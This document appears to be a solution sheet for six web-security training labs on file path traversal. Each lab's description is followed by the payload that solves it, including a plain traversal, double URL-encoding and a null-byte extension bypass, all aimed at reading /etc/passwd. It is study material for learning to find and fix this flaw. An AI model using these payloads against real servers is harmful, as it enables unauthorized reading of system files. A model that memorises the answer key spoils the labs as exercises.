```
Lab: File path traversal, simple case

APPRENTICE

This lab contains a file path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the /etc/passwd file. 
```

filename=../../../etc/passwd

---

```
Lab: File path traversal, traversal sequences blocked with absolute path bypass

PRACTITIONER

This lab contains a file path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the /etc/passwd file. 
```

/image?filename=/etc/passwd 

---

```
Lab: File path traversal, traversal sequences stripped non-recursively

PRACTITIONER

This lab contains a file path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the /etc/passwd file. 
```

/image?filename=....//....//....//etc//passwd

---

```
Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

PRACTITIONER

This lab contains a file path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the /etc/passwd file. 
```

/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

---

```
Lab: File path traversal, validation of start of path

PRACTITIONER

This lab contains a file path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the /etc/passwd file. 
```

/image?filename=/var/www/images/../../../../../etc/passwd 

---

```
Lab: File path traversal, validation of file extension with null byte bypass

PRACTITIONER

This lab contains a file path traversal vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the /etc/passwd file. 
```

/image?filename=../../../../etc/passwd%00.jpg

---


